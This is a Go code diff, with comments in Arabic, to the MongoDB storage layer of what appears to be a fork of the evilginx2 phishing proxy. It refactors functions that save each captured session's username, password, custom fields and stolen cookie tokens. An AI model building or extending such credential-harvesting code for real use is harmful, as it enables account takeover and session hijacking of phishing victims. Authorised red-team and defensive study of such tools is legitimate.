@@ -3,7 +3,6 @@ package database
 import (
 	"context"
 	"fmt"
-	"strings"
 	"time"
 
 	"github.com/kgretzky/evilginx2/log"
@@ -476,31 +475,88 @@ func (m *MongoDatabase) SetSessionHttpTokens(sid string, tokens map[string]strin
 }
 
 // UpdateSessionUsername يحدث اسم المستخدم للجلسة
-func (m *MongoDatabase) SetSessionUsername(sid string, username string) error {
-	return m.UpdateSession(sid, "username", username)
+func (m *MongoDatabase) UpdateSessionUsername(sid string, username string) error {
+	now := time.Now().UTC().Unix()
+	_, err := m.sessionsColl.UpdateOne(
+		m.ctx,
+		bson.M{"session_id": sid},
+		bson.M{
+			"$set": bson.M{
+				"username":    username,
+				"update_time": now,
+			},
+		},
+	)
+	return err
 }
 
 // UpdateSessionPassword يحدث كلمة المرور للجلسة
-func (m *MongoDatabase) SetSessionPassword(sid string, password string) error {
-	return m.UpdateSession(sid, "password", password)
+func (m *MongoDatabase) UpdateSessionPassword(sid string, password string) error {
+	now := time.Now().UTC().Unix()
+	_, err := m.sessionsColl.UpdateOne(
+		m.ctx,
+		bson.M{"session_id": sid},
+		bson.M{
+			"$set": bson.M{
+				"password":    password,
+				"update_time": now,
+			},
+		},
+	)
+	return err
 }
 
 // UpdateSessionCustom يحدث بيانات مخصصة للجلسة
-func (m *MongoDatabase) SetSessionCustom(sid string, name, value string) error {
-	return m.UpdateSession(sid, fmt.Sprintf("custom.%s", name), value)
+func (m *MongoDatabase) UpdateSessionCustom(sid string, name string, value string) error {
+	now := time.Now().UTC().Unix()
+	_, err := m.sessionsColl.UpdateOne(
+		m.ctx,
+		bson.M{"session_id": sid},
+		bson.M{
+			"$set": bson.M{
+				fmt.Sprintf("custom.%s", name): value,
+				"update_time":                  now,
+			},
+		},
+	)
+	return err
 }
 
 // SetSessionCookieTokens يحدث رموز الكوكيز للجلسة
 func (m *MongoDatabase) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
-	return m.UpdateSessionTokens(sid, map[string]map[string]string{
-		"cookie_tokens": {
-			"cookie_tokens": bson.M{
-				"$set": bson.M{
-					"cookie_tokens": tokens,
-				},
+	// تحويل رموز الكوكيز إلى التنسيق المناسب لـ MongoDB
+	cookieTokens := make(map[string]map[string]interface{})
+	
+	for domain, domainTokens := range tokens {
+		if _, ok := cookieTokens[domain]; !ok {
+			cookieTokens[domain] = make(map[string]interface{})
+		}
+		
+		for name, token := range domainTokens {
+			cookieData := map[string]interface{}{
+				"name":      token.Name,
+				"value":     token.Value,
+				"path":      token.Path,
+				"http_only": token.HttpOnly,
+			}
+			cookieTokens[domain][name] = cookieData
+		}
+	}
+	
+	now := time.Now().UTC().Unix()
+	
+	_, err := m.sessionsColl.UpdateOne(
+		m.ctx,
+		bson.M{"session_id": sid},
+		bson.M{
+			"$set": bson.M{
+				"cookie_tokens": cookieTokens,
+				"update_time":   now,
 			},
 		},
-	})
+	)
+	
+	return err
 }
 
 // SetupSession تقوم بإعداد جلسة كاملة مع جميع المعلومات الأساسية
@@ -529,4 +585,19 @@ func (m *MongoDatabase) SetupSession(
 	}
 
 	return nil
+}
+
+// SetSessionUsername يحدث اسم المستخدم للجلسة
+func (m *MongoDatabase) SetSessionUsername(sid string, username string) error {
+	return m.UpdateSessionUsername(sid, username)
+}
+
+// SetSessionPassword يحدث كلمة المرور للجلسة
+func (m *MongoDatabase) SetSessionPassword(sid string, password string) error {
+	return m.UpdateSessionPassword(sid, password)
+}
+
+// SetSessionCustom يحدث بيانات مخصصة للجلسة
+func (m *MongoDatabase) SetSessionCustom(sid string, name, value string) error {
+	return m.UpdateSessionCustom(sid, name, value)
 } 
